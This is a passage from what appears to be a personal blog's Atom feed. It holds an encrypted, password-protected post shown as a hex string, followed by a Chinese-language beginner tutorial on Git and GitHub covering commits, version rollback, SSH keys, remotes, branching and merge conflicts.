6744d8e85fb3408f9ad89b8724e6fb880f5a0c8fd7397406769ce7c18c214f5dce4e8445400e827a0e5bebb0930fcfc98f83d3e99688d9ae849a39ca2cd31828dfdc7b860d768f1338e8fb017301ae3d8b9386f200f63bd5b266153757d63905266d005d46ee10fd75924d6fef689cb876b399910da12d54d17ce123bee134f793e7641c946a842e84896695c8073c6f5fdacdceeecb77298969e0689f90c186d5866a2ba1948f8b67faf0a252a27aad9b7fd2d371e5f416574ad0ea22512fe004cc2ad6f6f150108bde37fa9d379cb01229c78985f540e5b5ddcd15c724a55d98cc9e4d895f54e631138f8f356429acfed98feb2667c3ed1c3c0626f660725272004d077ff6e4c2572cdbe1df4411362d4fb7ee3488fb426893cd977de43ce10c054c05f8a80ac74bfd31c5f52397f1d7882013f5cc86a9c73b50e5c7bc5616943dc17d2a3456fe3813aea9135de99092a48697d8fd75844caeb205e37a477bf70d1cc8c483ca2203657156ee7185e72d8b0790b1db24183317345d476d9fba76eaa998416d4758d38b462d1f1092673367c1c78bde2b61ebead2d4d79c7bba7d31564f2dde106903a7d28feddc8b6e8ab344bd8913a18085c8136611c261ec16af57fdb55b131cd635621e18194d4bcc7892f8cf836809e19723ce91a4858dfa9cea3ceaa105b5976fc9ec9d14053333f39cb522ffb6eb7ba721e8db266880be6af1876cfe3075dc9e9d0bc1e88de003f8c9c5ced92156c15c393682f301dd2fff4ff6839c1399baeb880bcb2a2dc93d9fd7ff9ed5d69550426c2bd79d9c70e69139c119af6b4fe7c867b8694a97c80653af494d246561dffe5cef772bd5fdfb48879d03f66e0391b55b5ec5ad47c167990e690b773156627fdc1ac381c41b1e435217ebdb70d6653c33defceae77c3f6f4d2aeb9f29c84e3a04947786daac6054616dbf13423220dc0741af6cb3714531905dc0a2b95d20a7f5283e341c1a0d7cc2e9b61cbe863a8fbb7143f25e7ed14f63d5bd0d0633564cae99ef97f48fe8ae7e55db9f1c1247762d8d0ef319973f2283dc357ac6d7f50c3f630a5b5cda6d5a3581e003122ddb762876a3b2535c13dc6f84904ff331f1692514dfebc9680bfe38ce8bdf84a1bfccf39a7fd6d2310c91889d24476bbba761c96e2c94f7d80916cefdddf19adab9c120153d5ae0175c075f73aee7a4e7c2485b21a9f2c0746d1ffb22b75c94414daa2fd2d1a45f6dd472dde84c4ed0e6958d9b3998e8e5f658fb6a8b05f1c50851d5954ede0e19aa116529dc99c5e0c479514b985c67f4dbcf27baba1f0c16d19e4da98eeaa60a7637794fec6d2ec9d820abc61bbbb5f595115e5180be7bba16de317a2d804aced5a1c607e5456a36bc07b312937d93252a59cfb8045ee5297fc4335fc07bc3654121e36c1c7ed02b8f559930d7792bc04034051621793c86950c01892176be330ea5088d1a94160d87d6f3d0a1e773e923d000320109117b524a5774f8b262ee9a6f97560972f22087655d131f9b41672e9a54bd47d172e84902d1f69877fe5d78d41c02012253da95caaa9f9398f4a53bade7fde858b639fa600b89cd7ab4bdc396cb5c4dc5648f018264d9ba8fe5e13a2df2aa1cff69c5725111669e372fae92c557b4939131864800abf22f1a9e6a9a4cc32407a4ac53d0dcffe3611d413fd22941838e13200575e16319ee6dfab734dc73829286cb0235d6f9e4697af124844000e828c8a647e42f463ae930b86db89bbe7ad80ff705f38577808d229caa7d0e8c5a9daeb0e0863277ab46f81a2644f53828118dc68cc6a43e39eee6726ff53973cede103b4e265c94d1cd8100df1b6aad593a853a6906496e09ef0bc26dfb105675dd7d5735ca89d791d0212c88c066666ac82ae5851f214c0dbcc1996eb6356e72006d0b4bce0f52adcef3a75b90bada6740e3cd8b9f2c34bbb64d26a7ed8e5777d0da8ae4592a906b941b86c480f7424a5a5a0a978894e11ac16a59ea7ebe26d042fbe55bae4c18fc0da4ee0c69e9608307d752ed088bc193617beafba2771c38de595a40053de8fcef1384d348cac2985c6982d1ad67e2127d08b5c61c22fd07766745d47689218168b830baf81adc29b639b66b33c6194088dfec508264d7077ded0fd3e25ae1403d26b2b1531c05e58fbc75531b0775cf4786d1b2d7d1f5afa70b50b9b3c9e36dcb2971501f183fecfb3952fabcac8ce3dc93c105da54f17926c133c1de99ba2e8da5cafcf07b78499a75be147d7d3d43d36501358e4aaae07f1ba61fcebbf06f1852c9d201935b7cb859431da25eb0dfc4e92a9ca4523f35656d62f580e912cd39f14202f571387920ed9549a1cbb0de4d96389037bbeaa4fe5c4bba291139aeaafefee11829103f805dca421256a779e30caf813ba5640876862192f727097144fca6e5f56bb71994444e23efa41fb588b972ec91c4201eecc8c474dc1ed2ee0c1802842f2c273f6433226af6bc04ce8ce5ed78c6e82aede865e85d2a8ea0834f216a423e2e56159464c92a416a2ee36537c01e8a20db1d0cfd125fc1c4d8068c7298dffb5580bcb396e33f6f5a0c434870f00fed61f578c7cdda65ffdc2fdb4502a4ceae3e100479acf9738c324d34c11a91a43f72694fc6f3d855f5ba48427111e6245575c86b236bb6eed71b45c3389e4cc838d9ba6771c0583273c11a232b7f2cbcbd9540476bdc4744975a01b915121c9683751202db2c7a641f4e18ea67763cc2f5093527bb6dba23559ee829e23e8c9f0bf120da40760fafae1333b2d668cf5eb642a2f36dadfd121afc8e4bc25d26f93f9df6e8b20f7b76b198abfbd84c84b72a982c014ab702db962070f7ad3e385cd29a2b7b1f3eeac8658107df6b642f4a3d4eae829ff711dc0734e2d2d53a52d0073579eecdd15e3c3c9f46a95d8b40c650537a84d9d3cc8974184348454ffb170ef3c6ea2adb238b71b33b32fe7faa4cf8fa29c4c2a1617864f0feedd096368a9baadab8056413b18d493c85fc9adfd5e19a2a502a17d1c3d234ee2e895a45c6269e9a275471fc74bdb3a58d1475f4e3db8e36d1d683dd462fd22c6b04b553e5e5c9da84b04f08fb24a9b544c0cbfdd039e86052bb6eb25b99ea338a06f19c98a8550f25338d61f6a819255d284196379fcff18ebeca654efce18dd238f0c55c02507283659191717d36c394582b787d460ab43fae48f1e0c5bbd89d84a3a1a75ce1c1a06d1335623b8c2aaa0c0dc1ae903cac43e9e272601c6bc191f6aa27f99e7414cf87cd4c61a72740afce5fa52771430e7152e2019feef25a32a6d0ad9ba5bb533aec76c313df14a907347bf7f2bae7021baa173be80fc9dc94b95ae61e10e57f628d4ee00e9696fd90ffae5e0cd40aded6878a3a2324e282e2a1b1dbb1ad1dc4fadcbda616d2f165f99271f0dd6123682108366208939ca7e8bdd3ef79cb760a68f15fb7ad674a3e7ed731a77881d1578d5159be56930c6eacf69b8497b10a48439b4219ded8afa1bd273f42f287aa824076854241327db4b30bda8ab9aaa6b0cdffd8ae184fb15e40f66c98f4896e067b6b1dcc9002d91ce4db1f7f3d752a6f046c1a397cd4d0283ef0eb3bc9da5044cfe869d3146d6cb83f5e9db6c4be42f75d67b9d57aa210914febafd0a0861852146374e701882f8091e71d7d635716e30c05d58fe81e0262235aeeec58009e876b93cf5d7246054c4e4c3e62cd471fc1bdfe0e2aaf1fad6183ef536fab6d967fd0696c525e65c622e4c903192abb925ea535ba12abec33f9d84bf99561264db7456fbc75ab4b7db2304b4b99644c1c803e6460e4de48a61afe864add2bec32e04b2c4ae4ed724c9759a6b3fa08e389bfdc35799b3f3462b0d18927394a1861356a38103379d33279ff778d9022fca9d60ce85c5addd84082e82fe00f1410f6d2827a29d5fefe8db92e9fb6080c136fa7c1754542e81b1a5709bfd23c15154c341573f80fcc50fcad4980e8417a301dd1065832c24ff86a5f74aea5cf79c0f9a03c1bf311cf7e6b924a4b5f62f84d0de12d276e4b1eefb09eed11c496b051ac3d26fbfed416f3d32bd649b0973e160fbd8e31594a1d116ee53282a5a9e586fe4bb66262dc7cb3900bfb5587f54dbbbeef871991939a2fa0fea308f9636d2b2be136fae68ffff1278e4c7581aae407b43a00a122f929fc6d69d5cfe86871439ae503af63574632b024b4bdc9f568499647ae068f3811ba40e89e8d2cca685c74dd21dcc4f1d8224f7b3f91c5af8835352813ba970129d1b0991bcdf110562054180bf5efba97405196399964c993748316037c0241cca4b8ae4ed853c7513d8a23a64cd20dc7ef342f18e8eddd15b185d8748130e78e3065582380b2781d783a3908d88c2258f17819d05634925915853812b97c64458d62b0fd7922ddb5b2895894fc3afa91c08f8d0227dd61a981c006dba23f9115b5bbca4ee2c61f479842bf4076d07423ccd42ee6d995cf4dcc0d098ceb88b226c0aeba97f4d5dff45a7fd72b69ac410ef0cb1dcb6c115f7ad7ae4f4471c6d8a06966eb6dcb05c481eec7c7b7edf5e413712d52e6f600f7c001ff0554db29d5a61ab01d9a362b2824809dc9e3a9e1fa6ce4b798b8d1006dbcc91ac77310aea5ecd500621da0d6b57938ee5489c843785e7afd270398139e03f2526032affce259c337e533ee973ad1451244f912a0e99cacedd17cf6a96d1022dc84fc8836d68b0da8d5f98cbc4f95607446cc1c68eb377cc7c380242ee2af6a52ef9c780507a04f815c0b0dd50b22cdba5a9e63a6ed8e4089e7de31dfb97b00fba03af3156eb8abf49a7f592ca63941a4e110e31548bd3a567ebd2726cd0de0d28900594456fa492bd8934143ba5bb511a6b57eaaf806ee79a99e18a872cfadc87f6a3447e9639832f2f2a6776bd987ad6c94281b91ed1e92c44a98bc3394f971bcdf6e4c6ad758d9134bac8183eae36acf7f262ac72670d2c6aa19fde9c60a3d4adac7bb2c2c5832b7d4b4b77e440e87b3489b921d68e26c53e3fd00483ca8881f48f30f83b908c4f140e692c524f5c1078fc66b3758b40982900b1aa351f6575200ca928b752b9bc67bfd7c40125777c952cbdb707448ee66ae054553d8f0805ca2a12573c30633a2f111d1aad231d897bcbbc31effaf0c5a77d5f0b78dd1266f318bdb13ebb3e9958164fb554de6a9341a0c1890f13cf0c55304484deeca7fcf1d2e97a36616b467db9b870a5715ad689cc9dc1d0766ee7b867327e59babac5f78b0ec10f55b9d71d57b643f4e99318d7c5a811b07bed91d893cc8c126b264491c71d52f60acc994cee65d5bb787e10e08abb2746d9aaa071132767409fc189a0ce12eb46e008121e8a1f784376cd3c9a2321846821b05cda338adff8afd3360497d655c86ae9e7765281bb75589a93ba25e14a25527166b8e2edecdba305899acbd0cd2d18ab4d61991ae67578a710bbe5be9a7703550085c0986286c7cb56d00c3919aeaa09b83bb8e984171232c5d69a90c59dbc908dbbdc94d680ea0cbccfbd489aca95193ef74241aa431480bc9a211601ccf7b739db1418f9cd6074dc8462c3037e930095a4f1b356157dda74dd9633e0b8a573452f1981728df999739ae6103c3f10edb3032c4cf51cfee5700445282236a1fac1ab23d4f59dcad78ad56d289a421999bbac2ca384330949f5eea50b36e79482a8fc28a8d47f0831685a5530e174f1aaf40477bb4723c3518cbb0dec2cf57e8294b445f09057416ccd7c3d82862b62d2bb9f4859dcde57cdb61dc5013b4edc881002d7498c64ff465e0009ceaada4c178d647a1f83c2bc890fe2dbf2a31ca857e2a96c77f69b390194d32fec6715c7b969d003cba2d3bc72ea2e6470021b067267b06828613928adfdcfa72d0275c4166138d745c55abc774618a1e493566a7ea718d1135a72a55123fb43f8b7adde096fe8b74dbf504eb1b57f8fd9add5890c61c402044f2000ebb7da81480aef35266dce74f0cea5e4b311dc20a15bac5019f177645bd6fd98249ca64664a0ccfaed2acbfcac083eb947936605e3802b7bd5aa3957ce15d0b806ddee37896b345540f63d1eec6990a2a5eb31cbbd0563094a93f8ce06ad22ca46c8137a52cb81f05418a99b13a9570b276ef7fca4a26504aabcda3d757d1ced86dde2209c0b1c40963c600845d9cca8f5c8c8ad6649f1df01798f6ea608c1e5a223a730ac65d433a70d262c24625b340d3db421308e912f254997b921b03b4cd2e440d3a81939196f4b8a9ac847f7eb8776f42cfc746fcb20a46bf55a65bd1248a29abc9e725648abe7b15c3588aae77af49</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>Git以及Github的使用教程</title>
    <link href="https://muzibing.github.io/2020/07/29/2020.07.29%EF%BC%88143%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/29/2020.07.29（143）/</id>
    <published>2020-07-28T16:00:00.000Z</published>
    <updated>2020-08-23T10:14:39.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、Git-教程"><a href="#一、Git-教程" class="headerlink" title="一、Git 教程"></a>一、Git 教程</h3><h4 id="1-Git-介绍"><a href="#1-Git-介绍" class="headerlink" title="1.Git 介绍"></a>1.Git 介绍</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Git (/ɡɪt/) is a distributed version-control system for tracking changes in source code during software development.[8] It is designed for coordinating work among programmers, but it can be used to track changes in any set of files. Its goals include speed,[9] data integrity,[10] and support for distributed, non-linear workflows.[11]  Git was created by Linus Torvalds in 2005 for development of the Linux kernel, with other kernel developers contributing to its initial development.[12] Its current maintainer since 2005 is Junio Hamano. As with most other distributed version-control systems, and unlike most client–server systems, every Git directory on every computer is a full-fledged repository with complete history and full version-tracking abilities, independent of network access or a central server.[13] Git is free and open-source software distributed under the terms of the GNU General Public License version 2.—wiki</p><blockquote><p>Git是一个分布式版本控制系统，用于在软件开发过程中跟踪源代码的变化。它是为协调程序员之间的工作而设计的，但可用于跟踪任何文件集中的更改。其目标包括速度数据完整性以及对分布式非线性工作流的支持。</p><p>Git由Linus Torvalds于2005年创建，用于Linux内核的开发，其他内核开发人员也为Git的初始开发做出了贡献。自2005年以来，它的当前维护者是Junio Hamano。与大多数其他分布式版本控制系统一样，与大多数客户端服务器系统不同，每台计算机上的每个Git目录都是具有完整历史记录和完整版本跟踪功能的成熟存储库，而与网络访问或中央服务器无关。 Git是根据GNU通用公共许可版本2的条款分发的免费和开源软件。</p></blockquote><h4 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2.安装Git"></a>2.安装Git</h4><p><code>Linux</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p><code>Windows</code></p><blockquote><p>在Windows上使用Git，可以从Git官网直接<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">下载安装程序</a>，然后按默认选项安装即可。安装完成后，在开始菜单里找到“Git”-&gt;“Git Bash”，蹦出一个类似命令行窗口的东西，就说明Git安装成功！</p></blockquote><p><code>配置Git用户名</code></p><blockquote><p>这要和配置github的信息要区分开来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"email@example.com"</span></span></span><br></pre></td></tr></table></figure><h4 id="3-创建版本库"><a href="#3-创建版本库" class="headerlink" title="3.创建版本库"></a>3.创建版本库</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先有必要了解一下版本库的工作区和暂存区：</p><p><img src="/images/143-1.png" alt></p><blockquote><p>如上图所示，工作区有一个隐藏目录<code>.git</code>，这个不算工作区，而是Git的版本库，上图就是在演示将文件从工作区移到版本库中，分为了两步。Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支<code>master</code>，以及指向<code>master</code>的一个指针叫<code>HEAD</code>。</p><p>一定要在空目录下创建</p></blockquote><p><code>初始化</code></p><blockquote><p>将自己创建的空目录变为Git可以管理的仓库</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br></pre></td></tr></table></figure><p><code>把文件添加到版本库</code></p><blockquote><p>第一步，用命令<code>git add</code>告诉Git，把文件添加到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git add fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>第二步，用命令<code>git commit</code>告诉Git，把文件提交到仓库：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"&lt;本次提交的说明&gt;"</span></span></span><br></pre></td></tr></table></figure><p><code>查看仓库当前状态</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br></pre></td></tr></table></figure><h4 id="4-修改文件"><a href="#4-修改文件" class="headerlink" title="4.修改文件"></a>4.修改文件</h4><blockquote><p>查看修改的内容</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git diff fileName</span></span><br></pre></td></tr></table></figure><h4 id="5-版本回退"><a href="#5-版本回退" class="headerlink" title="5.版本回退"></a>5.版本回退</h4><p><code>查看历史记录</code></p><blockquote><p>显示从最近到最远的提交日。</p><font size="2">需要友情提示的是，你看到的一大串类似`1094adb...`的是`commit id`（版本号），和SVN不一样，Git的`commit id`不是1，2，3……递增的数字，而是一个SHA1计算出来的一个非常大的数字，用十六进制表示，而且你看到的`commit id`和我的肯定不一样，以你自己的为准。为什么`commit id`需要用这么一大串数字表示呢？因为Git是分布式的版本控制系统，如果还要研究多人在同一个版本库里工作，如果大家都用1，2，3……作为版本号，那肯定就冲突了。</font></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></span><br></pre></td></tr></table></figure><p><code>版本回退</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^/SHA1-ID</span></span><br></pre></td></tr></table></figure><blockquote><p>上一个版本就是<code>HEAD^</code>，上上一个版本就是<code>HEAD^^</code>，当然往上100个版本写100个<code>^</code>比较容易数不过来，所以写成<code>HEAD~100</code>。</p><p>Git的版本回退速度非常快，因为Git在内部有个指向当前版本的<code>HEAD</code>指针，当你回退版本的时候，Git仅仅是把HEAD从指向<code>回退前的状态</code>改为指向<code>回退后的状态</code>，然后顺便把工作区的文件更新了。</p></blockquote><p><code>查看每一次命令的信息</code></p><blockquote><p>要重返未来，用<code>git reflog</code>查看命令历史，以便确定要回到未来的哪个版本。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reflog</span></span><br></pre></td></tr></table></figure><h4 id="6-撤销修改"><a href="#6-撤销修改" class="headerlink" title="6.撤销修改"></a>6.撤销修改</h4><p><code>丢弃工作区的修改</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- fileName</span></span><br></pre></td></tr></table></figure><blockquote><p>命令<code>git checkout -- readme.txt</code>意思就是，把<code>readme.txt</code>文件在工作区的修改全部撤销，这里有两种情况：</p><ul><li><p>一种是<code>readme.txt</code>自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p></li><li><p>一种是<code>readme.txt</code>已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p></li></ul><p>总之，就是让这个文件回到最近一次<code>git commit</code>或<code>git add</code>时的状态。</p><font size="2">`git checkout -- file`命令中的`--`很重要，没有`--`，就变成了“切换到另一个分支”的命令</font></blockquote><h4 id="7-删除文件"><a href="#7-删除文件" class="headerlink" title="7.删除文件"></a>7.删除文件</h4><blockquote><p>在Git中，删除也是一个修改操作，</p></blockquote><p><code>确实要从版本库中删除该文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git rm test.txt</span></span><br><span class="line">rm 'test.txt'</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"remove test.txt"</span></span></span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure><h3 id="二、Github使用"><a href="#二、Github使用" class="headerlink" title="二、Github使用"></a>二、Github使用</h3><h4 id="1-创建SSH-Key"><a href="#1-创建SSH-Key" class="headerlink" title="1.创建SSH Key"></a>1.创建SSH Key</h4><blockquote><p>在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@example.com"</span></span></span><br></pre></td></tr></table></figure><blockquote><p>如果一切顺利的话，可以在用户主目录里找到<code>.ssh</code>目录，里面有<code>id_rsa</code>和<code>id_rsa.pub</code>两个文件，这两个就是SSH Key的秘钥对，<code>id_rsa</code>是私钥，不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p></blockquote><h4 id="2-登陆GitHub"><a href="#2-登陆GitHub" class="headerlink" title="2.登陆GitHub"></a>2.登陆GitHub</h4><blockquote><p>打开“Account settings”，“SSH Keys”页面，然后点“Add SSH Key”，填上任意Title，在Key文本框里粘贴<code>id_rsa.pub</code>文件的内容：</p></blockquote><p><img src="/images/143-2.png" alt></p><h4 id="3-添加远程库"><a href="#3-添加远程库" class="headerlink" title="3.添加远程库"></a>3.添加远程库</h4><p><code>情景</code></p><blockquote><p>已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p></blockquote><p><code>第一步</code></p><blockquote><p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p></blockquote><p><code>第二步</code></p><blockquote><p>在Repository name填入<code>learngit</code>，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p></blockquote><p><code>第三步</code></p><blockquote><p>将本地git仓库和远程的github仓库关联起来</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git remote add origin <span class="string">" Your Github address"</span></span></span><br></pre></td></tr></table></figure><p><code>第四步</code></p><blockquote><p>把本地仓库的所有内容推送到远程库上</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure><blockquote><p>把本地库的内容推送到远程，用<code>git push</code>命令，实际上是把当前分支<code>master</code>推送到远程。</p><p>由于远程库是空的，我们<strong>第一次推送<code>master</code>分支时，加上了<code>-u</code>参数</strong>，Git不但会把本地的<code>master</code>分支内容推送的远程新的<code>master</code>分支，还会把本地的<code>master</code>分支和远程的<code>master</code>分支关联起来，在以后的推送或者拉取时就可以简化命令。</p><p>此后，每次本地提交后，只要有必要，就可以使用命令<code>git push origin master</code>推送最新修改；</p></blockquote><h4 id="4-从远程仓库克隆"><a href="#4-从远程仓库克隆" class="headerlink" title="4.从远程仓库克隆"></a>4.从远程仓库克隆</h4><p><code>克隆一个本地库</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> git@<span class="string">"github address"</span></span></span><br></pre></td></tr></table></figure><h4 id="5-创建与合并分支"><a href="#5-创建与合并分支" class="headerlink" title="5.创建与合并分支"></a>5.创建与合并分支</h4><blockquote><p><code>HEAD</code>严格来说不是指向提交，而是指向<code>master</code>，<code>master</code>才是指向提交的，所以，<code>HEAD</code>指向的就是当前分支。一开始的时候，<code>master</code>分支是一条线，Git用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="/images/143-3.png" alt></p><blockquote><p>每次提交，<code>master</code>分支都会向前移动一步，这样，随着你不断提交，<code>master</code>分支的线也越来越长。</p><p>当我们创建新的分支，例如<code>dev</code>时，Git新建了一个指针叫<code>dev</code>，指向<code>master</code>相同的提交，再把<code>HEAD</code>指向<code>dev</code>，就表示当前分支在<code>dev</code>上：</p></blockquote><p><img src="/images/143-4.png" alt></p><blockquote><p>Git创建一个分支很快，因为除了增加一个<code>dev</code>指针，改改<code>HEAD</code>的指向，工作区的文件都没有任何变化！</p><p>不过，从现在开始，对工作区的修改和提交就是针对<code>dev</code>分支了，比如新提交一次后，<code>dev</code>指针往前移动一步，而<code>master</code>指针不变：</p></blockquote><p><img src="/images/143-5.png" alt></p><blockquote><p>假如我们在<code>dev</code>上的工作完成了，就可以把<code>dev</code>合并到<code>master</code>上。Git怎么合并呢？最简单的方法，就是直接把<code>master</code>指向<code>dev</code>的当前提交，就完成了合并：</p></blockquote><p><img src="/images/143-6.png" alt></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p><p>合并完分支后，甚至可以删除<code>dev</code>分支。删除<code>dev</code>分支就是把<code>dev</code>指针给删掉，删掉后，我们就剩下了一条<code>master</code>分支：</p></blockquote><p><img src="/images/143-7.png" alt></p><p><code>创建dev分支，然后切换dev分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git checkout -b dev</span></span><br></pre></td></tr></table></figure><blockquote><p><code>git checkout</code>命令加上<code>-b</code>参数表示创建并切换，相当于以下两条命令：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout dev</span></span><br></pre></td></tr></table></figure><p><code>查看当前分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch</span></span><br></pre></td></tr></table></figure><p><code>把dev分支的工作成果合并到master分支上</code></p><blockquote><p>要先执行<code>git add &quot;fileName&quot;</code>和<code>git commit &quot;fileName&quot;</code>，才能进行合并</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge dev</span></span><br></pre></td></tr></table></figure><blockquote><p>注意到上面的<code>Fast-forward</code>信息，Git告诉我们，这次合并是“快进模式”，也就是直接把<code>master</code>指向<code>dev</code>的当前提交，所以合并速度非常快。如果<font color="red">合并分支时加上<code>--no-ff</code>参数：表示禁用<code>Fast forward</code></font>的区别：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git merge --no-ff -m <span class="string">"merge with no-ff"</span> dev</span></span><br></pre></td></tr></table></figure><blockquote><p>下图是加上该参数的情况</p></blockquote><p><img src="/images/143-8.png" alt></p><p><code>查看分支合并的情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --graph</span></span><br></pre></td></tr></table></figure><h4 id="6-删除分支"><a href="#6-删除分支" class="headerlink" title="6.删除分支"></a>6.删除分支</h4><p><code>删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -d dev</span></span><br></pre></td></tr></table></figure><p><code>强行删除分支</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch -D dev</span></span><br></pre></td></tr></table></figure><h4 id="7-解决冲突"><a href="#7-解决冲突" class="headerlink" title="7.解决冲突"></a>7.解决冲突</h4><blockquote><p>Git用<code>&lt;&lt;&lt;&lt;&lt;&lt;&lt;</code>，<code>=======</code>，<code>&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>标记出不同分支的内容，如下：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line"><span class="meta">&gt;</span><span 